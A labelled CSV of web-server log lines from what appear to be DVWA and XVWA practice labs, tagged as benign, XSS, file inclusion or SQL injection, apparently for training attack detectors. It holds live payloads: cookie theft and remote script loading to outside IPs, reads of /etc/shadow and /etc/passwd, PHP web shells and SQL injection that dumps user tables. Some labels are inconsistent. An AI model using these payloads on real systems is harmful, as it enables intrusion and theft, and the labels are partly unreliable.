Logs,Attack,
"GET /dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 404 209",Benign,0
"GET /dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E HTTP/1.1"" [-] 200 1474",Benign,0
GET /?file=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F123.64.179.106%2F575002.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 5707 ,XSS,1
"GET ../../../../apache/logs/access.log HTTP/1.1"" 200 3096",Local File Inclusion,2
"GET /vulnerabilities/exec/ HTTP/1.1"" [-] 200 1444",Benign,0
"GET ../../../../apache/logs/error.log HTTP/1.1"" 200 2382",Local File Inclusion,2
"GET /dvwa/css/main.css HTTP/1.1"" [-] 304 0",Benign,0
"GET ../../../../etc/shadow HTTP/1.1"" 200 3982",Local File Inclusion,2
GET /dvwa/vulnerabilities/sqli/?id=%20AND%20%28SELECT%204523%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6a71%2C%28SELECT%20%28ELT%284523%3D4523%2C1%29%29%29%2C0x71706a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA%2eCHARACTER_SETS%20GROUP%20BY%20x%29a%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1676 ,SQL Injection,3
"GET /index.php HTTP/1.1"" [-] 200 2713 ""http://192.168.200.128/login.php",Benign,0
"GET /dvwa/dvwa/images/lock.png HTTP/1.1"" [-] 304 0",Benign,0
"GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1"" [-] 304 0",Benign,0
"GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1"" 200 1829",Local File Inclusion,2
"GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1"" 200 2834",Local File Inclusion,2
"GET /dvwa/ HTTP/1.1"" [-] 302 5",Benign,0
"GET /dvwa/dvwa/css/main.css HTTP/1.1"" [-] 200 4026 ""http://192.168.180.128/dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd",Local File Inclusion,2
"GET /dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd HTTP/1.1"" [-] 200 1628",Local File Inclusion,2
"POST /login.php HTTP/1.1"" [username=admin&password=password&Login=Login&user_token=b05b5f987d93f9447f5525a9c2c528f6] 302 5",Benign,0
"GET /dvwa/vulnerabilities/fi/?page=php://filter/resource=/etc/passwd HTTP/1.1"" [-] 200 1630 ""http://192.168.180.128/dvwa/vulnerabilities/fi/?page=include.php",Local File Inclusion,2
"GET /dvwa/js/dvwaPage.js HTTP/1.1"" [-] 304 0",Benign,0
"GET / HTTP/1.1"" [-] 403 152",Benign,0
"GET /dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 304 0",Benign,0
GET /dvwa/vulnerabilities/sqli/?id=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%29%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1676 ,SQL Injection,3
"GET /dvwa/dvwa/css/main.css HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=javascript%3Aalert%281%29",Benign,0
"GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 304 0",Benign,0
"GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/vulnerabilities/xss_r/?name=javascript%3Aalert%281%29",Benign,0
"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1"" [-] 200 53",Local File Inclusion,2
"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1"" [<?php echo shell_exec($_GET['cmd']);?>\x0D\x0A] 200 53",Local File Inclusion,2
"GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1"" [-] 200 1030 ""http://192.168.180.128/dvwa/index.php",Benign,0
"GET /dvwa HTTP/1.1"" [-] 301 194 ""-",Benign,0
"GET /dvwa/dvwa/images/login_logo.png HTTP/1.1"" [-] 200 9088 ""http://192.168.180.128/dvwa/login.php",Benign,0
"GET /dvwa/index.php HTTP/1.1"" [-] 200 2716 ""http://192.168.180.128/dvwa/login.php",Benign,0
"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1"" [<?php echo shell_exec($_GET['cmd']);?>\x0D\x0A] 200 53",Local File Inclusion,2
"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1"" [<?php echo shell_exec($_GET['cmd']);?>] 200 53",Local File Inclusion,2
GET /dvwa/vulnerabilities/sqli/?id=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1675 ,SQL Injection,3
"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1"" [<?php echo shell_exec($_GET['cmd']);?>] 200 53",Local File Inclusion,2
"GET /dvwa/login.php HTTP/1.1"" [-] 200 684",Benign,0
"GET //dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 304 0 ""http://192.168.200.128/vulnerabilities/exec/",Benign,0
"GET /dvwa/images/logo.png HTTP/1.1"" [-] 304 0 ""http://192.168.200.128/index.php",Benign,0
"GET /dvwa/dvwa/css/login.css HTTP/1.1"" [-] 304 0 ""http://192.168.154.128/dvwa/login.php",Benign,0
"POST /dvwa/login.php HTTP/1.1"" [username=admin&password=password&Login=Login&user_token=82cd68d7a0ff7418275ac0d9af67f899] 302 5 ""http://192.168.180.128/dvwa/login.php",Benign,0
"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1"" [<?php echo passthru(base64_decode($_GET['cmd']));?>\x0D\x0A] 200 1630",Local File Inclusion,2
"GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1"" [<?php echo passthru(base64_decode($_GET['cmd']));?>] 200 1630",Local File Inclusion,2
"GET /favicon.ico HTTP/1.1"" [-] 404 152 ""http://192.168.180.128/",Benign,0
"GET /dvwa/dvwa/css/main.css HTTP/1.1"" [-] 200 4026 ""http://192.168.180.128/dvwa/index.php",Benign,0
"GET /dvwa/dvwa/css/login.css HTTP/1.1"" [-] 200 842 ""http://192.168.180.128/dvwa/login.php",Benign,0
GET /dvwa/vulnerabilities/sqli/?id=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1675 ,SQL Injection,3
"GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2C%60user%60%2Cavatar%2Cfailed_login%2Cfirst_name%2Clast_login%2Clast_name%2Cpassword%2Cuser_id%29%29%2C0x717a786b71%29%2CNULL%20FROM%20dvwa.users--%20-&Submit=Submit HTTP/1.1"" [-] 200 82",SQL Injection,3
"GET /favicon.ico HTTP/1.1"" [-] 404 152 ""http://192.168.180.128/dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd",Local File Inclusion,2
"GET get.php?file=../../../../apache/logs/access.log HTTP/1.1"" 200 2577",Local File Inclusion,2
"GET get.php?file=../../../../apache/logs/error.log HTTP/1.1"" 200 3774",Local File Inclusion,2
"GET get.php?file=../../../../etc/passwd HTTP/1.1"" 200 6062",Local File Inclusion,2
"GET get-files?file=../../../../apache/logs/access.log HTTP/1.1"" 200 7538",Local File Inclusion,2
"GET get-files?file=../../../../etc/passwd HTTP/1.1"" 200 1264",Local File Inclusion,2
"GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccolumn_name%2Ccolumn_type%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x6775657374626f6f6b%20AND%20table_schema%3D0x64767761--%20-&Submit=Submit HTTP/1.1"" [-] 200 82",SQL Injection,3
GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccolumn_name%2Ccolumn_type%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x64767761--%20-&Submit=Submit HTTP/1.1,SQL Injection,3
GET /?file=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 1175 ,XSS,1
GET /?file=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 2244 ,XSS,1
GET /?file=%3Cscript%3E%window.open%28%27http%3A%2F%2F119.28.107.63%2F430999%27%293C%2Fscript%3E HTTP/1.1  200 4720 ,XSS,1
GET /?file=%3Cscript%3E%window.open%28%27http%3A%2F%2F132.144.70.196%2F536457%27%293C%2Fscript%3E HTTP/1.1  200 2570 ,XSS,1
GET /?file=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F104.232.239.10%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 7536 ,XSS,1
"GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1"" 200 2634",Local File Inclusion,2
"GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1"" 200 4714",Local File Inclusion,2
"GET main.cgi?file=../../../../etc/shadow HTTP/1.1"" 200 2086",Local File Inclusion,2
"GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1"" 200 6032",Local File Inclusion,2
"POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1"" [cmd=ls&cwd=null] 200 146",Local File Inclusion,2
"POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1"" [cmd=ls&cwd=null] 200 146",Local File Inclusion,2
"POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1"" [cmd=whoami&cwd=null] 200 84",Local File Inclusion,2
"POST /dvwa/hackable/uploads/shell.php?feature=shell HTTP/1.1"" [cmd=ls&cwd=%2Fvar%2Fwww%2Fhtml%2Fdvwa%2Fhackable%2Fuploads] 200 124",Local File Inclusion,2
"POST /dvwa/hackable/uploads/shell.php?feature=shell HTTP/1.1"" [cmd=whoami&cwd=%2Fvar%2Fwww%2Fhtml%2Fdvwa%2Fhackable%2Fuploads] 200 84",Local File Inclusion,2
"GET / HTTP/1.1"" [-] 403 208",Benign,0
"GET /favicon.ico HTTP/1.1"" [-] 404 209",Benign,0
"GET /xvwa/ HTTP/1.1"" [-] 200 3382",Benign,0
"GET /xvwa/img/xvwa-logo.png HTTP/1.1"" [-] 304 0",Benign,0
"GET /xvwa/vulnerabilities/ssti/ HTTP/1.1"" [-] 200 3112",Benign,0
"GET /dvwa/security.php HTTP/1.1"" [-] 200 2219",Benign,0
"GET /dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 404 209",Benign,0
"GET /dvwa/vulnerabilities/brute/ HTTP/1.1"" [-] 200 1475",Benign,0
"GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1"" [-] 200 593",Benign,0
"GET /dvwa/vulnerabilities/exec/ HTTP/1.1"" [-] 200 1444",Benign,0
